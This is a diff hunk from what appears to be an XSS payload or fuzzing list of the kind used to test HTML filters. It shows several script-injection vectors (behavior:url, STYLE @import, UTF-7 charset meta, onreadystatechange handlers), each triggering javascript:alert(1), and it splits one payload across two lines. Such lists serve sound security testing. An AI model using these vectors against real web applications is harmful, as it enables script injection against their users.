@@ -452,7 +452,8 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
 <STYLE>@import'%(css)s';</STYLE>
 <STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>
-<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
+<meta charset= "x-
+imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
 <SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
 <style onreadystatechange=javascript:javascript:alert(1);></style>
 <?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
